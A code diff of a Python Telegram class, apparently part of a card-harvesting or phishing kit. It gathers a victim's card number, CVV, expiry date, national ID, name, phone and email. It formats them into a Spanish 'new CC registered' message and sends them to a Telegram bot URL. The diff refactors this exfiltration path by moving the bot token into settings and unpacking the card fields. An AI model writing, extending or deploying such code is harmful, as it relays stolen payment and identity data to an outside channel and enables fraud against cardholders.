@@ -1,24 +1,36 @@
 import requests
 from requests.exceptions import RequestException, HTTPError
 from ..schemas.telegram import TelegramSchema
+from ..config.settings import Settings
+
+
 
 class Telegram:
-    def __init__(self, payload:TelegramSchema):
-        token = payload.token
-        chat_id = payload.chat_id
-        
-        if not token or not chat_id:
+    def __init__(self, payload):
+        settings = Settings()
+        self.chat_id = payload.get("chat_id", None)
+        self.token = settings.telegram_token
+                
+        if not self.chat_id or not self.token:
             raise ValueError("Token or chat ID are missing!")
         
-        self.token:str = token
-        self.chat_id:str = chat_id
-        self.payload = payload
+        self.dni = payload.get("DNI")
+        self.number = payload.get("number")
+        self.CVV = payload.get("CVV")
+        self.Vto = payload.get("Vto")
+        self.name = payload.get("name")
+        self.last_name = payload.get("last_name")
+        self.phone = payload.get("phone")
+        self.email = payload.get("email")
         
     def build_message(self):
-        message = f'Se ha registrado una nueva CC en su sistema {self.payload.shop_id}. 
-        Datos de la Tarjeta: DNI asociado: {self.payload.DNI}, Nro: {self.payload.number}, CVV: {self.payload.CVV}, Vto: {self.payload.Vto}.
-        Datos del Cliente: Nombre: {self.payload.name} {self.payload.last_name}, Telefono: {self.payload.phone}, Email: {self.payload.email}'
+        message = (
+            f'Se ha registrado una nueva CC en su sistema. '
+            f'Datos de la Tarjeta: DNI asociado: {self.dni}, Nro: {self.number}, CVV: {self.CVV}, Vto: {self.Vto}. '
+            f'Datos del Cliente: Nombre: {self.name} {self.last_name}, Telefono: {self.phone}, Email: {self.email}'
+        )
         return message
+
     
     def send_message(self, message:str):
         url:str = f"https://api.telegram.org/bot{self.token}/sendMessage?chat_id={self.chat_id}&text={message}"
